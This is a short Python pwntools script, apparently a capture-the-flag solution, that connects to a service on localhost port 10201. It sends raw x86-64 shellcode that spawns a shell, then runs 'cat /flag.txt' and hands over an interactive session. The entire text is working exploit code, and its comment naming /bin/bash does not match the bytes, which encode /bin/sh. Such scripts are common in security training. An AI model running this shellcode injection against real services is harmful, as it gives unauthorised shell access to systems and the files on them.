#!/usr/bin/env python3

from pwn import *

p = remote("127.0.0.1", 10201)

p.recv()

# execve("/bin/bash", NULL, NULL)
# https://shell-storm.org/shellcode/files/shellcode-909.html
p.sendline(b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x54\x5f\x31\xc0\x50\xb0\x3b\x54\x5a\x54\x5e\x0f\x05")

p.sendline(b"cat /flag.txt")
p.interactive()
